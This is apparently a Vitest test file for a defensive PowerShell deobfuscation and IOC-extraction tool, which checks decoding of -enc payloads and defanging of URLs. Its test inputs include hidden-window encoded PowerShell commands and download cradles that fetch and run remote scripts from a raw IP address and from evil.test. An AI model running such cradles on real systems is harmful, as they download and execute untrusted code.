import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('analyze (scaffold)', () => {
  it('returns a shaped AnalysisResult for empty input', async () => {
    const r = await analyze('')
    expect(r.input).toBe('')
    expect(r.flags).toEqual([])
    expect(r.layers).toEqual([])
    expect(r.iocs).toEqual([])
    expect(r.signals).toEqual([])
    expect(r.characterization).toBeNull()
    expect(r.bullets).toEqual([])
    expect(typeof r.copyText).toBe('string')
    expect(r.confidence.state).toBe('fully-decoded')
  })
})

describe('analyze — end to end (depth 1)', () => {
  const ENC = 'SQBFAFgAIAAnAGgAaQAnAA==' // "IEX 'hi'"

  it('decodes a -enc command into a layer and reports the flags', async () => {
    const r = await analyze(`powershell -nop -w hidden -enc ${ENC}`)
    expect(r.flags.map((f) => f.flag).sort()).toEqual(['-enc', '-nop', '-w'])
    expect(r.layers[0].transform).toMatch(/UTF-16LE/)
    expect(r.layers[0].text).toBe("IEX 'hi'")
    expect(r.layers[0].state).toBe('fully-decoded')
  })

  it('extracts a URL from a plain download cradle and defangs it in copyText', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
    // Note: aligned to the app's real defang() output, which brackets EVERY dot
    // (not just the ones in the host) — see shared/verdict/doctrine.ts `defang`.
    expect(r.copyText).toContain('hxxp://45[.]9[.]148[.]20/a[.]ps1')
    expect(r.copyText).toContain('NOT executed')
  })

  it('is deterministic (ignoring checkedAt)', async () => {
    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
    expect(strip(await analyze(`-enc ${ENC}`))).toEqual(strip(await analyze(`-enc ${ENC}`)))
  })

  it('does not crash on a malformed -enc payload — surfaces it as opaque', async () => {
    const r = await analyze('powershell -nop -enc AAAAAAAAA') // 9 chars — not a multiple of 4
    expect(r.layers).toHaveLength(1)
    expect(r.layers[0].state).toBe('opaque')
    expect(r.layers[0].text).toBeNull()
    expect(r.confidence.state).toBe('partial')
  })
})

describe('analyze — deobfuscation (Phase 2a)', () => {
  it('resolves a concatenation-obfuscated cradle and extracts its IOC', async () => {
    const r = await analyze("$u = 'http://ev'+'il.test'+'/a.ps1' ; IEX (New-Object Net.WebClient).DownloadString($u)")
    expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
  })
  it('caps recursion and never hangs on self-referential input', async () => {
    // must return (not hang); assertion is simply that it resolves
    const r = await analyze("$x = 'IEX $x' ; IEX $x")
    expect(r).toBeDefined()
  })
})
